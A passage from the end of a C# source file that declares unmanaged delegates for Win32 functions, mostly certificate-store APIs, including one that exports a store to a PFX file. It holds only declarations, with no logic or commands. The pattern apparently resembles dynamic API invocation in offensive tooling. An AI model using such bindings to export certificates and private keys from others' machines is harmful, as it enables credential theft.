            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate void DeleteProcThreadAttributeList(IntPtr lpAttributeList);

            // --- Certificate API delegates ---

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate IntPtr CertOpenSystemStoreW(IntPtr hProv, string szSubsystemProtocol);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr CertEnumCertificatesInStore(IntPtr hCertStore, IntPtr pPrevCertContext);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool CertCloseStore(IntPtr hCertStore, uint dwFlags);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool CertFreeCertificateContext(IntPtr pCertContext);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate bool PFXExportCertStoreEx(IntPtr hStore, ref CRYPT_DATA_BLOB pPFX, string szPassword, IntPtr pvPara, uint dwFlags);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr CertOpenStore(uint dwStoreProvider, uint dwEncodingType, IntPtr hCryptProv, uint dwFlags, IntPtr pvPara);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool CertAddCertificateContextToStore(IntPtr hCertStore, IntPtr pCertContext, uint dwAddDisposition, IntPtr ppStoreContext);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate uint CertGetNameStringW(IntPtr pCertContext, uint dwType, uint dwFlags, IntPtr pvTypePara, IntPtr pszNameString, uint cchNameString);
        }
    }
}
